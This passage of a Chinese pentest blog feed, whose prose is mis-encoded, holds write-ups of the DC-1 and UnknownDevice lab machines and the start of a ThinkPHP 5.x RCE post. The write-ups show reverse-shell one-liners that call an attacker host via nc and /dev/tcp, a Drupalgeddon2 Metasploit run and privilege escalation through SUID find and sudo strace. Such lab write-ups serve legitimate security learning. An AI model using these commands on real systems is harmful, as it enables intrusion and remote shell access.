&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;NC&quot;&gt;&lt;a href=&quot;#NC&quot; class=&quot;headerlink&quot; title=&quot;NC&quot;&gt;&lt;/a&gt;NC&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc -lvvp 6666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc -e /bin/sh 192.168.220.140 6666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>æ¸—é€å®æˆ˜:DC-1é¶æœºå…¥ä¾µ</title>
    <link href="https://t43wiu6.github.io/2019/03/23/DC-1/"/>
    <id>https://t43wiu6.github.io/2019/03/23/DC-1/</id>
    <published>2019-03-23T21:30:06.000Z</published>
    <updated>2019-03-28T02:31:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-åºç« "><a href="#0x01-åºç« " class="headerlink" title="0x01 åºç« "></a>0x01 åºç« </h2><ul><li>ä½œè€…:DCAU</li><li>éš¾åº¦å®šä½:æœªçŸ¥ï¼Œåˆçº§?</li><li>ç›®æ ‡:å…±æœ‰äº”ä¸ªflagï¼Œä½†æœ€ç»ˆç›®æ ‡æ˜¯åœ¨rootçš„ä¸»ç›®å½•ä¸­</li></ul><h2 id="0x02-æ–°ç©æ„"><a href="#0x02-æ–°ç©æ„" class="headerlink" title="0x02 æ–°ç©æ„"></a>0x02 æ–°ç©æ„</h2><a id="more"></a><p>è¿™æ¬¡æ¥å°è¯•ä¸€ä¸‹<code>æ–°ç©æ„</code>ï¼ŒNetDiscover</p><p>è¿™ä¸ªå‘ç°å·¥å…·æˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç”¨ï¼Œè™½ç„¶å¬è¯´è¿‡å¾ˆå¤šæ¬¡</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…ˆæŒ‡å®šä¸€ä¸‹ç½‘å¡</span></span><br><span class="line">sudo netdiscover -i eth2</span><br></pre></td></tr></table></figure><p><img src="NetDiscover.PNG" alt=""></p><blockquote><ul><li>192.168.135.131</li></ul></blockquote><p>é‰´äºä¸Šæ¬¡çš„ç»éªŒï¼Œè¿™æ¬¡æˆ‘æŒ‡å®šäº†æ›´å…¨é¢çš„æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -p- 192.168.135.131</span><br></pre></td></tr></table></figure><p><img src="Nmap.PNG" alt=""></p><p>å…ˆè¯•ä¸‹adminï¼Œ<code>Access denied</code>ï¼Œå¥½å§</p><p>é‚£æ¥è·‘ä¸‹ç›®å½•</p><p>ç„¶åâ€¦..ç„¶åç«™å°±è¢«æˆ‘è·‘å´©äº†,ğŸ¤¦ã¤ï¹âŠ‚</p><p><img src="error.PNG" alt=""></p><p>é‡å¯ä¸€ä¸‹è™šæ‹Ÿæœºï¼Œä¸è·‘äº†ä¸è·‘äº†ï¼Œå…ˆçœ‹çœ‹robotså§</p><p><img src="robots.PNG" alt=""></p><p>é€šè¿‡UPGRADE.txtå’ŒMAINTAINERS.txtåŸºæœ¬å¯ä»¥ç¡®è®¤æ˜¯Drupal 7.x(9 or 10)</p><h2 id="0x03-Drupalgeddon2-GetShell"><a href="#0x03-Drupalgeddon2-GetShell" class="headerlink" title="0x03 Drupalgeddon2 GetShell"></a>0x03 Drupalgeddon2 GetShell</h2><p><img src="drupalgeddon2.PNG" alt=""></p><p>å¯¹äºDrupalï¼Œæˆ‘æ‰¾åˆ°ä¸€ä¸ªå†å®³çš„æ´ï¼Œæ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p><p><img src="msf.PNG" alt=""></p><p>Msfä¸­ä¹Ÿæœ‰ï¼Œä½†åˆ©ç”¨å¹¶ä¸é¡ºåˆ©</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.135.131</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.135.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="msferror.PNG" alt=""></p><p>åè€Œåœ¨searchsploitä¸­æ‰¾åˆ°ä¸€ä¸ªåŸºäºrubyçš„å¯ç”¨exp</p><p><img src="searchsploit.PNG" alt=""></p><p>æˆåŠŸæ‹¿åˆ°äº†shellï¼Œä½†æˆ‘ä¸æ­»å¿ƒå†åº¦å°è¯•msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload php/reverse_php</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>äº‹å®è¯æ˜ï¼Œèƒ½å¼¹å›æ¥</p><p>æˆ‘å†æ¬¡è¿›è¡Œä¸€äº›æµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php/meterpreter_reverse_tcp PHP Meterpreter, Reverse TCP Inline</span><br><span class="line">php/meterpreter/reverse_tcp PHP Meterpreter, PHP Reverse TCP Stager</span><br><span class="line">generic/shell_reverse_tcp   Generic Command Shell, Reverse TCP Inline</span><br><span class="line">php/reverse_php             PHP Command Shell, Reverse TCP (via PHP)</span><br></pre></td></tr></table></figure><p>å‰ä¸¤è€…ä¸€ä¸ªæ˜¯ä½¿ç”¨å‘½ä»¤è¡Œå›è¿ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨phpå›è¿ï¼Œphpå›è¿èƒ½è¿ä¸Šä½†æ— æƒé™</p><p><img src="meterpreter.PNG" alt=""></p><p>è€Œæ™®é€šçš„genericå’Œphpéƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œå¥½çš„ï¼Œå¯ä»¥è¯´æ˜æ˜¯meterpreterçš„é”…</p><p>ç„¶è€Œä½“éªŒè¿˜ä¸å¦‚é‚£ä¸ªrubyçš„expï¼Œå’~</p><h2 id="0x04-Flag1-amp-Flag2"><a href="#0x04-Flag1-amp-Flag2" class="headerlink" title="0x04 Flag1&amp;Flag2"></a>0x04 Flag1&amp;Flag2</h2><p>è¿›æ¥webç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag1</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DC-1&gt;&gt; cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„æç¤ºï¼Œä¸€é¡¿æœç´¢ï¼ŒDrupalçš„é…ç½®æ–‡ä»¶åœ¨<code>sites/default/settings.php</code></p><p><img src="flag2.PNG" alt=""></p><blockquote><p>Getflag2<br>db:drupaldb<br>username:dbuser<br>password:R0ck3t</p></blockquote><p>é‚£æˆ‘ä»¬è¿ä¸Šå»mysqlçœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p>ç„¶è€Œä¹±ä¸ƒå…«ç³Ÿå•¥æœ‰ç”¨çš„ä¿¡æ¯éƒ½æ‰¾ä¸åˆ°</p><p>æœŸé—´æˆ‘åˆé‡æ–°å¼¹äº†ä¸€æ¬¡shellï¼Œåæ¥å‘ç°<br><img src="kernel.PNG" alt=""></p><p>å“‡å’”å’”ï¼Œä½ æ‡‚çš„</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o2 up.c</span><br></pre></td></tr></table></figure><p>éšå</p><p><img src="PyhtonServer.PNG" alt=""></p><p>æˆ‘åœ¨æœ¬æœºæ­å»ºäº†ä¸€ä¸ªç®€æ˜“çš„pythonæœåŠ¡å™¨</p><p>å¹¶wgetæ‹¿åˆ°exp</p><p><img src="wget.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x 2</span><br><span class="line">./2</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>ç„¶åå†çœ‹ä¸€ä¸‹åˆ«çš„è·¯</p><h2 id="0x05-SSHçˆ†ç ´ææƒ"><a href="#0x05-SSHçˆ†ç ´ææƒ" class="headerlink" title="0x05 SSHçˆ†ç ´ææƒ"></a>0x05 SSHçˆ†ç ´ææƒ</h2><p>è¿™æ—¶æˆ‘åˆæƒ³èµ·äº†flag2çš„æç¤ºï¼Œè·‘å­—å…¸.åŒæ—¶passwdä¸­ä¸€ä¸ªè´¦å·å¸å¼•äº†æˆ‘çš„æ³¨æ„</p><p><img src="flag4hint.PNG" alt=""></p><p>å°±æ˜¯å®ƒäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[22][ssh] host: 192.168.135.131   login: flag4   password: orange</span><br></pre></td></tr></table></figure><p>æ©™å­ï¼Œå‘ç°homeä¸‹è¿˜æœ‰ä¸ªflag4</p><p><img src="flag4.PNG" alt=""></p><h2 id="0x06-åŸºäºfindææƒ"><a href="#0x06-åŸºäºfindææƒ" class="headerlink" title="0x06 åŸºäºfindææƒ"></a>0x06 åŸºäºfindææƒ</h2><blockquote><p>æ³¨æ„ï¼šæˆ‘åœ¨å‘ç°flag4å‰å°±å·²ç»é€šè¿‡findæ‹¿åˆ°rootäº†ï¼Œä¸ºäº†æ–¹ä¾¿è§‚çœ‹æˆ‘æŠŠè¿‡ç¨‹æ”¾åˆ°äº†è¿™é‡Œï¼Œæ‰€ä»¥æœ‰äº›å›¾ç‰‡ä¸­çš„ç»ˆç«¯åå¯¹ä¸ä¸Šäº†</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="find.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p>findä¸­æä¾›äº†ä¸€å¤„å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½</p><p><img src="find2.PNG" alt=""></p><p><img src="thefinalflag.PNG" alt=""></p><h2 id="0x07-Flag3"><a href="#0x07-Flag3" class="headerlink" title="0x07 Flag3"></a>0x07 Flag3</h2><p>è™½ç„¶å·²ç»æ‹¿åˆ°äº†rootå¹¶é›†é½äº†å››ä¸ªflag</p><p>ä½†å¹¶æ²¡æœ‰æ‰¾åˆ°flag3ï¼ŒåŒæ—¶æƒ³èµ·flag2ä¸­å°†æˆ‘ä»¬å¼•å‘æ•°æ®åº“çš„ç›®çš„</p><p>æ•°æ®åº“æˆ‘ä»”ç»†ç¿»æ‰¾è¿‡ï¼Œå¹¶æ²¡æœ‰ç‰¹æ®Šçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬èƒ½åšçš„ä¸œè¥¿ä¸å¤šæ¯”å¦‚:å¾—åˆ°ç®¡ç†å‘˜å¯†ç </p><p>é‚£æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œç™»å½•åå°?</p><p><img src="admin.PNG" alt=""></p><p>å¦‚æœæ˜¯ä¸€èˆ¬æƒ…å†µï¼Œä¼°è®¡åªæœ‰è·‘johnäº†ï¼Œä½†è¿™æ¬¡ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬çŸ¥é“ç›</p><p><img src="salt.PNG" alt=""></p><p>å•Šï¼è¿˜æœ‰æ›´çœäº‹çš„æ–¹æ³•ï¼Œdrupalè‡ªå¸¦äº†äº†åŠ å¯†</p><p><img src="password-hash.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$S</span><span class="variable">$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p</span>.</span><br></pre></td></tr></table></figure><p>åˆ°æ•°æ®åº“ä¸­</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> pass = <span class="string">'$S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p.'</span> <span class="keyword">where</span> uid=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="flag3.PNG" alt=""></p><p>çœ‹æ ·å­æˆ‘æ˜¯ç›´æ¥è·³è¿‡äº†hintï¼Œæ‹¿rootäº†emmmmmm</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-åºç« &quot;&gt;&lt;a href=&quot;#0x01-åºç« &quot; class=&quot;headerlink&quot; title=&quot;0x01 åºç« &quot;&gt;&lt;/a&gt;0x01 åºç« &lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ä½œè€…:DCAU&lt;/li&gt;
&lt;li&gt;éš¾åº¦å®šä½:æœªçŸ¥ï¼Œåˆçº§?&lt;/li&gt;
&lt;li&gt;ç›®æ ‡:å…±æœ‰äº”ä¸ªflagï¼Œä½†æœ€ç»ˆç›®æ ‡æ˜¯åœ¨rootçš„ä¸»ç›®å½•ä¸­&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x02-æ–°ç©æ„&quot;&gt;&lt;a href=&quot;#0x02-æ–°ç©æ„&quot; class=&quot;headerlink&quot; title=&quot;0x02 æ–°ç©æ„&quot;&gt;&lt;/a&gt;0x02 æ–°ç©æ„&lt;/h2&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>æ¸—é€å®æˆ˜:UnknownDeviceé¶æœºå…¥ä¾µ</title>
    <link href="https://t43wiu6.github.io/2019/03/22/UnknownDevice/"/>
    <id>https://t43wiu6.github.io/2019/03/22/UnknownDevice/</id>
    <published>2019-03-23T00:52:20.000Z</published>
    <updated>2019-03-27T11:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><ul><li>éš¾åº¦å®šä½:ä¸­çº§</li><li>ä½œè€…ï¼šAjay Verma</li><li>ç›®æ ‡:è·å¾—rootå¹¶é˜…è¯»/root/flag.txt</li></ul><a id="more"></a><h2 id="0x02-ä¸»æœºæ‰«æ"><a href="#0x02-ä¸»æœºæ‰«æ" class="headerlink" title="0x02 ä¸»æœºæ‰«æ"></a>0x02 ä¸»æœºæ‰«æ</h2><p>å…ˆæ‰«ä¸€æ³¢</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.135.129</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</span><br><span class="line">|_http-title:    Website By Unknowndevice64   </span><br><span class="line">MAC Address: 00:0C:29:F9:6F:F5 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><blockquote><p>port 31337 pythonçš„ç®€æ˜“HTTPServer</p></blockquote><p><img src="31337.png" alt=""></p><p><img src="hint.png" alt=""></p><p>ä»£ç æœ‰hint</p><h2 id="0x03-å›¾ç‰‡éšå†™æœ¯"><a href="#0x03-å›¾ç‰‡éšå†™æœ¯" class="headerlink" title="0x03 å›¾ç‰‡éšå†™æœ¯"></a>0x03 å›¾ç‰‡éšå†™æœ¯</h2><p><img src="hidden.png" alt=""></p><p>æ˜¯å›¾ç‰‡éšå†™ï¼Œå…ˆåæ‹¿HxDå’ŒStegsolveåˆ†æè¿‡ï¼Œéƒ½ä¸è¡Œ</p><p>çœ‹äº†wpæ‰çŸ¥é“è¦ç”¨steghideï¼Œå‡ºå¸ˆä¸åˆ©</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide --extract -sf key_is_h1dd3n.jpg</span><br></pre></td></tr></table></figure><p>å¯†ç æ˜¯h1dd3n</p><p>å¾—åˆ°ä¸€ä¸²å¥‡æ€ªçš„ä¸œè¥¿</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.-----------------.&lt;----------------.--.++++++.---------.&gt;-----------------------.&lt;&lt;+++.++.&gt;+++++.--.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.-----------------.</span><br></pre></td></tr></table></figure><p>çœ‹ç€è¿™ä¸²ï¼Œå€’æ˜¯æƒ³åˆ°äº†ä»¥å‰æ¥è§¦è¿‡çš„jsfuckï¼Œä½†å…¶å®åˆä¸ä¸€æ ·</p><p>æŸ¥äº†äº›èµ„æ–™æ„Ÿè§‰å¯èƒ½æ˜¯BrainFuck</p><p><img src="brainfuck.png" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ud64:1M!<span class="comment">#64@ud</span></span><br></pre></td></tr></table></figure><p>è¿˜ä»¥ä¸ºæ˜¯å•¥åŠ å¯†ï¼ŒæŠ˜è…¾è®¸ä¹…ï¼Œå†æ¬¡èµ°æŠ•æ— è·¯â€¦.å¶ç„¶é—´å‘ç°ï¼Œè¿™åå­—emmm</p><p><img src="ud64.png" alt=""></p><p>è¿™æ˜¯ç”¨æˆ·å+å¯†ç ?å¯æ˜¯æ²¡æœ‰å¯ä»¥ç™»å½•çš„åœ°æ–¹å•Šï¼Œç«¯å£åªæœ‰<code>31337</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -p 1-65535 192.168.135.129</span><br></pre></td></tr></table></figure><p>æŒ‡å®šå…¨ç«¯å£ï¼Œå†æ‰«ä¸€æ¬¡ï¼Œ1337æœ‰SSHï¼Œçœ‹æ¥å°±æ˜¯å®ƒäº†</p><p><img src="ssh.png" alt=""></p><p>è¿›æ¥äº†??æ®Šä¸çŸ¥çœŸæ­£çš„æŒ‘æˆ˜æ‰åˆšåˆšå¼€å§‹</p><h2 id="0x04-rbashé™åˆ¶é€ƒé€¸"><a href="#0x04-rbashé™åˆ¶é€ƒé€¸" class="headerlink" title="0x04 rbashé™åˆ¶é€ƒé€¸"></a>0x04 rbashé™åˆ¶é€ƒé€¸</h2><p>ä¸Šæ¥å°±æ˜¯ls</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ud64@unknowndevice64_v1:~$ ls</span><br><span class="line">-rbash: /bin/ls: restricted: cannot specify `/<span class="string">' in command names</span></span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹çœ‹è¿™ä¸ªrbashæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</p><p><img src="rbash.png" alt=""></p><p>è¿™ä¹ˆå˜æ€???ï¼Œç»è¿‡ä¸€ç•ªæœç´¢</p><p>å‘ç°å¯ä»¥é€šè¿‡æŒ‰ä¸¤ä¸‹tabé”®è°ƒå‡ºå¯ä»¥æ‰§è¡Œçš„ç¨‹åº</p><p><img src="tab.png" alt=""></p><p>æœ€ç»ˆæ‰¾åˆ°ä¸¤å¤„å¯ç»•è¿‡é™åˆ¶shellçš„æ–¹æ³•</p><ul><li>vi æ‰§è¡Œ!/bin/sh</li><li>export PATH=$PATH:/bin/  export PATH=$PATH:/usr/bin</li></ul><p>ä½†æƒé™å—é™ï¼Œç¯å¢ƒå˜é‡æ˜¯åªè¯»ï¼Œåªæœ‰viäº†</p><p><img src="shell1.png" alt=""></p><p>å¾ˆå¥½ï¼Œç›®å‰å·²ç»è·å¾—äº†ä¸€ä¸ªâ€™â€™è¾ƒâ€™â€™æ­£å¸¸çš„shellï¼Œä½†æ˜¯æƒé™ä¾ç„¶å¾ˆä½</p><p>äº‹å®ä¸Šè¿™åªæ˜¯åœ¨viä¸­è¿è¡Œçš„ä¸€ä¸ªâ€™shellâ€™ï¼Œé‚£ä¹ˆå…ˆæŠŠå®ƒæåˆ°æ™®é€šçš„shell</p><p>æ¯”å¦‚è¿™æ ·</p><p><img src="shell2.png" alt=""></p><p>è¿™æ˜¯å› ä¸ºåœ¨viçš„shellä¸­å·²ç»æ‹¥æœ‰äº†ç¯å¢ƒå˜é‡çš„å†™å…¥æƒé™äº†</p><h2 id="0x05-ç ´é‡œæ²‰èˆŸstraceåˆ°root"><a href="#0x05-ç ´é‡œæ²‰èˆŸstraceåˆ°root" class="headerlink" title="0x05 ç ´é‡œæ²‰èˆŸstraceåˆ°root"></a>0x05 ç ´é‡œæ²‰èˆŸstraceåˆ°root</h2><p>ç°åœ¨ä¾æ—§æ²¡æœ‰åŠæ³•è¯»åˆ°rootä¸‹çš„flag</p><p>æŸ¥çœ‹äº†passwdï¼Œé™¤rootå¤–ï¼Œæœ‰bashçš„è´¦æˆ·è¿˜æœ‰ä¸€ä¸ªoperator</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0::/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/bin/bash</span><br><span class="line">ud64:x:1000:1000::/home/ud64:/bin/rbash</span><br></pre></td></tr></table></figure><p>ä½†ä¸çŸ¥é“å¯†ç ï¼Œä¹Ÿæ‰¾ä¸åˆ°å¯è¡Œçš„å†…æ ¸ææƒ</p><p>å†åº¦é™·å…¥åƒµå±€</p><p>æœ€ç»ˆï¼Œåœ¨å…ˆåæ£€æŸ¥äº†ç¯å¢ƒå˜é‡å’Œè¿›ç¨‹åï¼Œåœ¨æ£€æŸ¥sudoå¯æ‰§è¡Œå‘½ä»¤æ—¶å‘ç°<br><img src="sysud64.png" alt=""></p><p>å¯ä»¥ç”¨sudoæ‰§è¡Œ<code>/usr/bin/sysud64</code>ä½†æˆ‘å¹¶ä¸æ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆç¨‹åºï¼Œå¹¸å¥½æœ‰help</p><p>å…¶å®è¿™æ˜¯straceï¼Œä¸€ä¸ªç”¨ä»¥è¯Šæ–­ï¼Œè°ƒè¯•çš„ç¨‹åºï¼Œæ²¡é”™è°ƒè¯•å°±æ„å‘³ç€è¿è¡Œ!</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysud64 -o /dev/null /bin/bash -i &gt;&amp; /dev/tcp/192.168.135.130/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>ä»¥rootæƒé™è¿›è¡Œä¸€æ¬¡å¼¹shellå¹¶æŠŠæ‰€æœ‰è°ƒè¯•è¾“å‡ºåˆ°æœ€çˆ±çš„é»‘æ´<br><img src="root.png" alt=""></p><p>äº‹åå‘ç°å…¶å®å¯ä»¥ç›´æ¥æ‰§è¡Œ/bin/bash</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysud64 -o /dev/null /bin/bash</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸ç®¡ï¼Œæˆ‘å°±æ˜¯è¦å¼¹ï¼Œå°å£°é€¼é€¼</p><h2 id="0x06-GetFlag"><a href="#0x06-GetFlag" class="headerlink" title="0x06 GetFlag"></a>0x06 GetFlag</h2><p>A hacker does for love what others woud not do for money.</p><p><img src="flag.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x01-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x01 å‰è¨€&quot;&gt;&lt;/a&gt;0x01 å‰è¨€&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;éš¾åº¦å®šä½:ä¸­çº§&lt;/li&gt;
&lt;li&gt;ä½œè€…ï¼šAjay Verma&lt;/li&gt;
&lt;li&gt;ç›®æ ‡:è·å¾—rootå¹¶é˜…è¯»/root/flag.txt&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="æ¸—é€å®æˆ˜" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>åŸºäºPocsuiteçš„ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨</title>
    <link href="https://t43wiu6.github.io/2019/01/11/thinkphp-5-x-pocsuite/"/>
    <id>https://t43wiu6.github.io/2019/01/11/thinkphp-5-x-pocsuite/</id>
    <published>2019-01-11T22:58:00.000Z</published>
    <updated>2019-10-12T02:41:41.746Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åŠé†‰åŠé†’æ—¥å¤æ—¥,èŠ±è½èŠ±å¼€å¹´å¤å¹´ã€‚</p></blockquote><p>2019äº†ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><a id="more"></a><p>æ¼æ´åˆ†ææœ‰å¾ˆå¤šå¤§ä½¬å·¨ä½¬åšè¿‡äº†ï¼Œæˆ‘å°±ä¸çŒ®ä¸‘äº†emmmm<br>ç»™å¤§å®¶æ‰¾äº†ä¸€ç¯‡åˆ†æpaperï¼Œå»ºè®®å»ç ”ç©¶ç ”ç©¶</p><p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">æ°´æ³¡æ³¡</a></p><h2 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h2><ul><li>æ¼æ´å½±å“:Thinkphp 5.0.23åŠ5.1.31ä»¥ä¸‹(å³12æœˆ9æ—¥å®‰å…¨æ›´æ–°å‰æ‰€æœ‰ç‰ˆæœ¬)</li><li><img src="thinphp-5.x-release.JPG" alt=""></li><li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">vulnspyçš„æ¼æ´æºç </a></li><li><a href="http://www.thinkphp.cn/down/p/1.html" target="_blank" rel="noopener">å®˜æ–¹æ¼æ´æºç </a></li><li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">å®˜æ–¹githubæºç </a></li><li><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">Thinkphp v5.0.xè¡¥ä¸</a></li><li><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">Thinkphp v5.1.xè¡¥ä¸</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-97767" target="_blank" rel="noopener">seebug</a></li></ul><p>æ³¨æ„:å®˜ç½‘åªæœ‰5.0.xçš„ç‰ˆæœ¬ï¼Œæµ‹è¯•5.1.xéœ€è¦åˆ°githubè‡ªå·±cloneä¸€ä¸ªå†ç”¨composerå®‰è£…æˆ–è€…ç”¨vulnspyçš„</p><ul><li><a href="http://www.thinkphp.cn/topic/52362.html" target="_blank" rel="noopener">composer</a></li></ul><h2 id="å…¨å¹³å°å…±æœ‰å…·æœ‰æ¼æ´çš„ç±»"><a href="#å…¨å¹³å°å…±æœ‰å…·æœ‰æ¼æ´çš„ç±»" class="headerlink" title="å…¨å¹³å°å…±æœ‰å…·æœ‰æ¼æ´çš„ç±»"></a>å…¨å¹³å°å…±æœ‰å…·æœ‰æ¼æ´çš„ç±»</h2><p>å¯ä»¥ç»§ç»­æŒ–æ˜æ›´å¤špayloadï¼Œæˆ‘å°±ä¸(tai)æ¥(cai)äº†(le)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Loader</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Env</span><br><span class="line">think\Config</span><br><span class="line">think\Hook</span><br><span class="line">think\Lang</span><br><span class="line">think\Request</span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure><h2 id="ç¼–å†™å‰å‡†å¤‡"><a href="#ç¼–å†™å‰å‡†å¤‡" class="headerlink" title="ç¼–å†™å‰å‡†å¤‡"></a>ç¼–å†™å‰å‡†å¤‡</h2><p>å¯¹äºç½‘ä¸Šçš„payloadè¿›è¡Œäº†æ”¶é›†,æœ¬æ‰“ç®—åŸºäºä»¥ä¸‹å››ä¸ªpayloadè¿›è¡ŒPocçš„ç¼–å†™</p><h3 id="Request-input"><a href="#Request-input" class="headerlink" 